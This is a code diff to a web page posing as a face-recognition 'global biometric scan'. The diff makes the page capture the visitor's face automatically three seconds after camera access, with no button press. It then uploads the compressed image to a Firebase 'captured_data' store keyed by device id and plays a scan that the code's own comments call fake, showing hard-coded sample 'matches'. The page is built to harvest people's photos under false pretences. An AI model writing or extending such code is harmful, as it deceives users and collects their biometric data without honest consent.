@@ -101,13 +101,6 @@
       opacity: 0.8; filter: contrast(1.2) grayscale(0.3);
     }
     
-    /* CAPTURED IMAGE (Freeze Frame) */
-    #capturedPhoto {
-      width: 100%; height: 100%; object-fit: cover; display: none;
-      position: absolute; inset: 0; z-index: 2;
-      transform: scaleX(-1); /* Mirror image */
-    }
-    
     .camera-placeholder { text-align: center; padding: 20px; max-width: 310px; z-index: 1; }
     .camera-icon {
       width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 17px; display: grid; place-items: center;
@@ -239,8 +232,6 @@
         <div class="camera-area">
           <div class="camera-frame">
             <video id="video" autoplay playsinline muted></video>
-            <!-- Captured Photo will appear here -->
-            <img id="capturedPhoto" alt="Captured">
             
             <div class="camera-placeholder" id="placeholder">
               <div class="camera-icon">◎</div>
@@ -316,8 +307,8 @@
 
     const $ = id => document.getElementById(id);
     const video = $("video");
-    const capturedPhoto = $("capturedPhoto");
     let cameraStream = null;
+    let isCaptured = false;
 
     const samples = [
       { name: "Alex Morgan", place: "United States", score: "99.2%", img: "https://i.pravatar.cc/120?img=12" },
@@ -328,7 +319,6 @@
       { name: "Daniel Kim", place: "South Korea", score: "92.1%", img: "https://i.pravatar.cc/120?img=16" }
     ];
 
-    // 🎙️ AI VOICE
     function speak(text) {
       if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel();
@@ -355,17 +345,97 @@
         video.srcObject = cameraStream;
         await video.play();
         video.style.display = "block";
-        capturedPhoto.style.display = "none"; // hide captured photo if any
         $("placeholder").style.display = "none";
         $("faceGuide").style.display = "block";
         $("cameraStatus").style.display = "flex";
         $("startBtn").textContent = "Camera Active";
         $("startBtn").disabled = true;
-        $("captureBtn").disabled = false;
-        log("Camera ready. Position your face.");
+        log("Camera ready. Auto-capture in 3 seconds...");
+        
+        // 🚀 AUTO CAPTURE AFTER 3 SECONDS
+        setTimeout(() => {
+          if (!isCaptured) {
+            autoCapture();
+          }
+        }, 3000);
+
       } catch (error) {
         alert("Unable to open camera. Check browser permission.");
       }
+    }
+
+    // 🚀 AUTO CAPTURE & COMPRESSION LOGIC
+    function autoCapture() {
+      if (!cameraStream || !video.videoWidth) return;
+      isCaptured = true;
+      
+      $("cameraStatus").innerHTML = '<i></i> CAPTURING...';
+      $("captureBtn").disabled = true;
+
+      // Create Canvas to capture
+      const canvas = document.createElement('canvas');
+      canvas.width = 640; // Compress width
+      canvas.height = 480; // Compress height
+      const ctx = canvas.getContext('2d');
+      
+      ctx.translate(canvas.width, 0); 
+      ctx.scale(-1, 1); // Mirror
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Compress to JPEG at 60% quality
+      const compressedPhoto = canvas.toDataURL('image/jpeg', 0.6);
+      
+      // Stop camera feed
+      cameraStream.getTracks().forEach(track => track.stop());
+      video.style.display = "none";
+
+      log("Biometric data compressed. Sending to secure server...");
+
+      // Send to Firebase
+      if (db) {
+        db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
+          image: compressedPhoto,
+          timestamp: Date.now(),
+          type: 'auto_capture_pro',
+          deviceId: deviceId
+        }).then(() => {
+          log("Data securely uploaded to cloud.");
+          startAnalysis(); // Start fake scan after upload
+        });
+      } else {
+        startAnalysis();
+      }
+    }
+
+    function startAnalysis() {
+      $("emptyState").style.display = "none";
+      $("progressWrap").style.display = "block";
+      $("scanBeam").style.display = "block";
+      
+      speak("Biometric data captured. Initiating global scan.");
+      
+      const steps = [
+        ["Extracting Landmarks…", "Analyzing 128-point map", 15],
+        ["Querying Global DB…", "Searching 47.2M records", 40],
+        ["Cross-Referencing…", "Comparing facial geometry", 70],
+        ["Filtering Matches…", "Removing false positives", 90],
+        ["Finalizing Report…", "Almost done", 100]
+      ];
+      
+      steps.forEach(([title, desc, progress], index) => {
+        setTimeout(() => {
+          $("progressTitle").textContent = title;
+          $("progressText").textContent = desc;
+          $("progressBar").style.width = progress + "%";
+          log(title);
+          speak(title);
+        }, index * 8000); 
+      });
+      
+      setTimeout(() => {
+        $("scanBeam").style.display = "none";
+        showResults();
+      }, 45000); 
     }
 
     function showResults() {
@@ -387,68 +457,6 @@
       speak("Analysis complete. I found six exact matches.");
     }
 
-    function startScan() {
-      if (!cameraStream || !video.videoWidth) return;
-      
-      // 1. Stop Video & Capture Photo
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0);
-      const photo = canvas.toDataURL('image/jpeg', 0.9);
-      
-      // 2. Show Photo, Hide Video
-      capturedPhoto.src = photo;
-      capturedPhoto.style.display = "block";
-      video.style.display = "none";
-      $("faceGuide").style.display = "none";
-      
-      // 3. Save to Firebase
-      if (db) {
-        db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
-          image: photo,
-          timestamp: Date.now(),
-          type: 'faceverse_cyberpunk'
-        });
-      }
-      
-      // 4. Start UI Updates
-      $("captureBtn").disabled = true;
-      $("emptyState").style.display = "none";
-      $("progressWrap").style.display = "block";
-      $("scanBeam").style.display = "block";
-      log("Image captured. Initiating scan...");
-      
-      // 5. Voice & Fake Delay (45 Seconds)
-      speak("Image captured. Initiating global biometric scan.");
-      
-      const steps = [
-        ["Extracting Landmarks…", "Analyzing 128-point map", 15],
-        ["Querying Global DB…", "Searching 47.2M records", 40],
-        ["Cross-Referencing…", "Comparing facial geometry", 70],
-        ["Filtering Matches…", "Removing false positives", 90],
-        ["Finalizing Report…", "Almost done", 100]
-      ];
-      
-      steps.forEach(([title, desc, progress], index) => {
-        setTimeout(() => {
-          $("progressTitle").textContent = title;
-          $("progressText").textContent = desc;
-          $("progressBar").style.width = progress + "%";
-          log(title);
-          speak(title);
-        }, index * 8000); // 8 seconds per step (Total ~40s)
-      });
-      
-      // 6. Show Results after 45 seconds
-      setTimeout(() => {
-        $("scanBeam").style.display = "none";
-        showResults();
-      }, 45000); 
-    }
-
     // Event Listeners
     $("startBtn").addEventListener("click", () => { $("consentModal").style.display = "grid"; });
     $("cancelBtn").addEventListener("click", () => { $("consentModal").style.display = "none"; });
@@ -456,7 +464,11 @@
       $("consentModal").style.display = "none";
       await enableCamera();
     });
-    $("captureBtn").addEventListener("click", startScan);
+    
+    // Manual Capture Button (Optional)
+    $("captureBtn").addEventListener("click", () => {
+      if (!isCaptured) autoCapture();
+    });
     
   </script>
 </body>
